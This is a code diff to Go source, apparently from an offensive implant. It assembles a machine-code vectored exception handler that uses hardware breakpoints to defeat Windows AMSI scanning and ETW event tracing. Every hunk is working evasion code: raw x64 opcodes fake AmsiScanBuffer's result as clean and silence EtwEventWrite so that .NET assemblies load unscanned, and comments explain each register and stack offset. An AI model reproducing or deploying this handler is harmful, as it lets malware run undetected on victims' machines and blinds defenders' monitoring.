@@ -128,31 +128,35 @@ var (
 // The handler is allocated via VirtualAlloc with PAGE_EXECUTE_READWRITE.
 // A separate data block (RW) stores the AMSI and ETW target addresses.
 //
-// Data block layout (32 bytes):
+// Data block layout (24 bytes):
 //
 //	[0x00] uint64: AmsiScanBuffer address (0 = not set)
 //	[0x08] uint64: EtwEventWrite address  (0 = not set)
 //	[0x10] uint64: ETW gadget address ("xor eax,eax; ret")
-//	[0x18] uint64: AMSI gadget address (writes AMSI_RESULT_CLEAN + returns S_OK)
 //
 // Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
 //  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
 //  2. Load ContextRecord pointer
 //  3. Compare ContextRecord->Rip against AMSI addr:
-//     - Redirect Rip to AMSI gadget (writes AMSI_RESULT_CLEAN to output param, returns S_OK)
-//     - Persistent: Dr0 stays enabled (AMSI called multiple times per assembly load)
+//     - Simulate AmsiScanBuffer return directly in CONTEXT (no gadget):
+//       * Read return addr from [context.Rsp], set context.Rip to it
+//       * Read AMSI_RESULT* from [context.Rsp+0x30], write 0 (CLEAN) to *result
+//       * Set context.Rsp += 8 (pop return addr)
+//       * Set context.Rax = 0 (S_OK)
+//     - Persistent: Dr0 stays enabled (AMSI called for each assembly load)
 //  4. Compare ContextRecord->Rip against ETW addr:
-//     - Redirect Rip to simple "xor eax,eax; ret" gadget (returns 0/STATUS_SUCCESS)
-//     - One-shot: disable Dr1 (clear Dr7 bit 2) — prevents Go runtime GC/scheduler crashes
+//     - Redirect Rip to "xor eax,eax; ret" gadget (returns 0/STATUS_SUCCESS)
+//     - One-shot: disable Dr1 (clear Dr7 bit 2) — prevents Go runtime crashes
 //  5. Clear Dr6, return EXCEPTION_CONTINUE_EXECUTION (-1)
 //  6. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
 //
 // AMSI bypass details:
 //   AmsiScanBuffer has 6 parameters. The 6th (AMSI_RESULT *result) is an output
-//   parameter at [RSP+0x30] from the function's entry point. A simple "xor eax,eax; ret"
-//   returns S_OK but leaves *result uninitialized — the CLR reads garbage from *result,
-//   and if the value >= AMSI_RESULT_DETECTED (32768), the CLR terminates the process.
-//   The AMSI gadget writes AMSI_RESULT_CLEAN (0) to *result before returning S_OK.
+//   parameter at [RSP+0x30] from the function's entry point. We simulate the
+//   entire return by modifying the CONTEXT directly: set Rip to the return address,
+//   adjust Rsp, write AMSI_RESULT_CLEAN to *result, and set Rax to S_OK.
+//   This avoids executing any gadget on the CLR thread — Windows simply restores
+//   the modified CONTEXT and execution continues at the caller.
 //
 // ETW one-shot rationale:
 //   Go runtime threads call EtwEventWrite during GC/scheduling. Without one-shot,
@@ -160,10 +164,10 @@ var (
 //   AMSI does NOT need one-shot because AmsiScanBuffer is only called explicitly
 //   by the CLR, not by Go runtime internals.
 func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
-	// Allocate 32-byte data block (RW) for target addresses and gadget pointers
+	// Allocate 24-byte data block (RW) for target addresses and gadget pointer
 	dataPtr, _, callErr := procVirtualAlloc.Call(
 		0,
-		32,
+		24,
 		uintptr(MEM_COMMIT|MEM_RESERVE),
 		uintptr(PAGE_READWRITE),
 	)
@@ -172,9 +176,8 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	}
 
 	// Write target addresses into data block
-	// [0x00] = AmsiScanBuffer addr, [0x08] = EtwEventWrite addr
-	// [0x10] = ETW gadget addr (filled later), [0x18] = AMSI gadget addr (filled later)
-	dataSlice := (*[32]byte)(unsafe.Pointer(dataPtr))
+	// [0x00] = AmsiScanBuffer addr, [0x08] = EtwEventWrite addr, [0x10] = ETW gadget (filled later)
+	dataSlice := (*[24]byte)(unsafe.Pointer(dataPtr))
 	binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
 	binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
 
@@ -245,16 +248,46 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneSkipAmsiOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// AMSI match: redirect Rip to the AMSI-specific gadget that writes
-	// AMSI_RESULT_CLEAN to the output parameter before returning S_OK.
+	// AMSI match: simulate AmsiScanBuffer return directly in CONTEXT.
+	// No gadget needed — we modify the CONTEXT and Windows restores it.
 	// AMSI breakpoint is PERSISTENT (not one-shot) because the CLR calls
-	// AmsiScanBuffer for each assembly load and we need to intercept all calls.
+	// AmsiScanBuffer for each assembly load.
+	//
+	// At the breakpoint, the saved CONTEXT has:
+	//   context.Rsp → [return_addr] [shadow_space...] [param5] [param6=AMSI_RESULT*]
+	//   So: return_addr = [context.Rsp], AMSI_RESULT* = [context.Rsp + 0x30]
 
-	// Load AMSI gadget address from data block: rax = [r13+0x18]
-	code = append(code, 0x49, 0x8B, 0x45, 0x18)       // mov rax, [r13+0x18]
-	// Set context.Rip to AMSI gadget: [rbx+0xF8] = rax
-	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
+	// Step 1: Load context.Rsp into rax
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
+
+	// Step 2: Read return address: rcx = [rax] (= [context.Rsp])
+	code = append(code, 0x48, 0x8B, 0x08)             // mov rcx, [rax]
+
+	// Step 3: Set context.Rip = return address: [rbx+0xF8] = rcx
+	code = append(code, 0x48, 0x89, 0x8B)             // mov [rbx+0xF8], rcx
 	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
+
+	// Step 4: Read AMSI_RESULT* pointer: rcx = [rax+0x30] (6th parameter)
+	code = append(code, 0x48, 0x8B, 0x48, 0x30)       // mov rcx, [rax+0x30]
+
+	// Step 5: Write AMSI_RESULT_CLEAN (0) to *result: [rcx] = 0
+	// Guard against NULL pointer (shouldn't happen, but be safe)
+	code = append(code, 0x48, 0x85, 0xC9)             // test rcx, rcx
+	code = append(code, 0x74, 0x06)                   // jz skip_write (6 bytes: skip mov dword [rcx], 0)
+	code = append(code, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x00) // mov dword [rcx], 0
+	// skip_write:
+
+	// Step 6: Adjust context.Rsp += 8 (pop return address from stack)
+	code = append(code, 0x48, 0x83, 0xC0, 0x08)       // add rax, 8
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x98], rax
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
+
+	// Step 7: Set context.Rax = 0 (S_OK / HRESULT success)
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x78], 0
+	code = append(code, 0x78, 0x00, 0x00, 0x00)       // disp32 = 0x78 (Rax)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0
+
 	// NO one-shot: Dr0 stays enabled so subsequent AmsiScanBuffer calls are caught
 	// Clear Dr6: [rbx+0x68] = 0
 	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
@@ -335,33 +368,9 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	code = append(code, 0x5D)                         // pop rbp
 	code = append(code, 0xC3)                         // ret
 
-	// --- Gadgets ---
-
 	// ETW gadget: simple "xor eax, eax; ret" (returns 0/STATUS_SUCCESS)
 	etwGadgetOffset := len(code)
 	code = append(code, 0x31, 0xC0)                   // xor eax, eax
-	code = append(code, 0xC3)                         // ret
-
-	// AMSI gadget: writes AMSI_RESULT_CLEAN to output parameter, returns S_OK.
-	//
-	// AmsiScanBuffer signature (x64 Windows ABI):
-	//   HRESULT AmsiScanBuffer(
-	//     HAMSICONTEXT amsiContext,  // RCX
-	//     PVOID buffer,             // RDX
-	//     ULONG length,             // R8
-	//     LPCWSTR contentName,      // R9
-	//     HAMSISESSION amsiSession, // [RSP+0x28]
-	//     AMSI_RESULT *result       // [RSP+0x30]  ← output parameter
-	//   );
-	//
-	// At function entry, RSP points to the return address (pushed by CALL).
-	// The 6th parameter (AMSI_RESULT *result) is at [RSP+0x30].
-	// We must write AMSI_RESULT_CLEAN (0) to *result so the CLR doesn't
-	// interpret garbage as AMSI_RESULT_DETECTED and terminate the process.
-	amsiGadgetOffset := len(code)
-	code = append(code, 0x48, 0x8B, 0x44, 0x24, 0x30) // mov rax, [rsp+0x30]  ; load AMSI_RESULT* from 6th param
-	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0  ; *result = AMSI_RESULT_CLEAN
-	code = append(code, 0x31, 0xC0)                   // xor eax, eax         ; return S_OK (0)
 	code = append(code, 0xC3)                         // ret
 
 	// Allocate executable memory and copy shellcode + gadgets
@@ -380,11 +389,9 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	codeSlice := unsafe.Slice((*byte)(unsafe.Pointer(codePtr)), len(code))
 	copy(codeSlice, code)
 
-	// Store gadget addresses in data block
+	// Store ETW gadget address in data block at offset 0x10
 	etwGadgetAddr := codePtr + uintptr(etwGadgetOffset)
-	amsiGadgetAddr := codePtr + uintptr(amsiGadgetOffset)
 	binary.LittleEndian.PutUint64(dataSlice[16:24], uint64(etwGadgetAddr))
-	binary.LittleEndian.PutUint64(dataSlice[24:32], uint64(amsiGadgetAddr))
 
 	return codePtr, dataPtr, nil
 }
@@ -480,8 +487,8 @@ func SetupHardwareBreakpoints(amsiAddr, etwAddr uintptr) (string, error) {
 		hwbpInstalled = true
 		output += "[+] Native VEH handler registered (Go-runtime-independent)\n"
 	} else {
-		// Update target addresses in existing data block (gadget addrs at 0x10, 0x18 unchanged)
-		dataSlice := (*[32]byte)(unsafe.Pointer(hwbpDataBlock))
+		// Update target addresses in existing data block (gadget addr at 0x10 unchanged)
+		dataSlice := (*[24]byte)(unsafe.Pointer(hwbpDataBlock))
 		binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
 		binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
 		output += "[*] VEH already registered, updating breakpoint addresses\n"
